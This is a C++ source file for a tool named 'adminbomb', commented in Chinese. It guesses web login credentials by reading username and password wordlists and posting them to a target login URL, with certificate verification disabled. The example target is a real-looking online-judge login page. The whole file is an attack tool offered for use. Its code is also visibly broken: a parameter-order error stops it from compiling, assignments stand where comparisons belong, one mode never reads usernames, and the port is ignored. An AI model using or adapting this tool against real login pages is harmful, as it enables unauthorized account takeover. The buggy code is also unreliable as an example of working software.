// adminbomb.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include <string>
#include "httplib.h"
#include <cstdlib> 
#include <thread>
#include<fstream>

#include <mutex>

//模式1:知道用户名破解密码 //模式2:知道密码破解用户名  纯暴力破解因为觉得这个方式过于不合适未加入
std::string Boom_1(const std::string& BaseURL, const std::string& Path,int Port = 443,bool if_https)
{
    if (if_https = 1)
    {
        httplib::SSLClient client(BaseURL);
        client.enable_server_certificate_verification(false);
        std::string user = "", pwd = "";
        std::ifstream inf1,inf2;
        inf1.open("C://users.txt"); // 这里必须是双斜杠
        inf2.open("C://password.txt"); //同上
        std::string user_id = user;
        while (std::getline(inf2, pwd))
        {
            std::string password = pwd;
            //std::string xxx = "自行添加";
            httplib::Params params{
           {"user_id", user_id },
           {"password", password } //这里也可以扩展
            };
            auto res = client.Post(Path, params);
            switch (res->status) {
            case 200:
                return pwd;
            case 302:
                return pwd;
            }
        }
    }
    if (if_https = 1)
    {
        httplib::Client client(BaseURL);
        //client.enable_server_certificate_verification(false);
        std::string user = "", pwd = "";
        std::ifstream inf1, inf2;
        inf1.open("C://users.txt"); // 这里必须是双斜杠
        inf2.open("C://password.txt"); //同上
        std::string user_id = user;
        while (std::getline(inf2, pwd))
        {
            std::string password = pwd;
            //std::string xxx = "自行添加";
            httplib::Params params{
           {"user_id", user_id },
           {"password", password } //这里也可以扩展
            };
            auto res = client.Post(Path, params);
            switch (res->status) {
            case 200:
                return pwd;
            case 302:
                return pwd;
            }
        }
    }
    return "未找到密码";
}

std::string Boom_2(const std::string& BaseURL, const std::string& Path, int Port = 443, bool if_https)
{
    if (if_https = 1)
    {
        httplib::SSLClient client(BaseURL);
        client.enable_server_certificate_verification(false);
        std::string user = "", pwd = "";
        std::ifstream inf1, inf2;
        inf1.open("C://users.txt"); // 这里必须是双斜杠
        inf2.open("C://password.txt"); //同上
        std::string password = pwd;
        while (std::getline(inf2, pwd))
        {
            std::string user_id = user;
            //std::string xxx = "自行添加";
            httplib::Params params{
           {"user_id", user_id },
           {"password", password } //这里也可以扩展
            };
            auto res = client.Post(Path, params);
            switch (res->status) {
            case 200:
                return pwd;
            case 302:
                return pwd;
            }
        }
    }
    if (if_https = 1)
    {
        httplib::Client client(BaseURL);
        //client.enable_server_certificate_verification(false);
        std::string user = "", pwd = "";
        std::ifstream inf1, inf2;
        inf1.open("C://users.txt"); // 这里必须是双斜杠
        inf2.open("C://password.txt"); //同上
        std::string user_id = user;
        while (std::getline(inf2, pwd))
        {
            std::string password = pwd;
            //std::string xxx = "自行添加";
            httplib::Params params{
           {"user_id", user_id },
           {"password", password } //这里也可以扩展
            };
            auto res = client.Post(Path, params);
            switch (res->status) {
            case 200:
                return pwd;
            case 302:
                return pwd;
            }
        }
    }
    return "未找到密码";
}
int main()
{
    std::string RawURL = ""; int if_https = 1; std::string Port = "443"; std::string Path = ""; int boom_type = 1;
    std::cout << "请输入目标URL(不带http/https , e.g hznuoj.dup4.cn/OJ/loginpage.php 支持端口,如:8080)" << std::endl;
    std::cin >> RawURL;
    std::cout << "请输入目标是否为https,如是请输入1,不是则输入0" << std::endl;
    std::cin >> if_https;
    if (if_https != 1 && if_https !=0)
    {
        /*
        std::cout << "食不食油饼" << std::endl;
        exit(0);
        */
        std::cout << "输入错误！默认使用https!" << std::endl;
    }
    std::cout << "采用哪种爆破方式? 1为已知用户名爆破密码  2为已知密码爆破用户名" << std::endl;
    try
    {
        std::cin >> boom_type;
        if (boom_type != 1 && boom_type != 2)
        {
            throw std::invalid_argument("参数错误!必须是1或2");
        }
    }
    catch (const std::invalid_argument& e)
    {
        std::cout << e.what();
    }
    //std::cout << "请输入使用的线程数,默认为8" << std::endl;
    //int threads = 8;
    //std::cin >> threads;
    std::cout << "即将开始尝试使用字典爆破（确保user.txt和password.txt目录正确）" << std::endl;
    std::string BaseURL = RawURL.substr(0,RawURL.find("/"));
    if (RawURL.find(":") == std::string::npos)
    {
        Path = RawURL.substr(RawURL.find("/") + 1); 
    }
    else
    {
        Path = RawURL.substr(RawURL.find("/") + 1, RawURL.rfind(":") - RawURL.find("/") - 1);
        Port = RawURL.substr(RawURL.rfind(":") + 1);
    }
    if (boom_type == 1)
    {
       // for (int i = 1; i <= threads; i++) {
            std::thread t(Boom_1, BaseURL, Path, std::stoi(Port), if_https);
            t.join();
       // }
    }
    else
    {
        std::thread t(Boom_2, BaseURL, Path, std::stoi(Port), if_https);
        t.join();
    }
    /*
    std::cout << BaseURL << std::endl;
    std::cout <<  Path << std::endl;
    std::cout << Port << std::endl;
    */
}

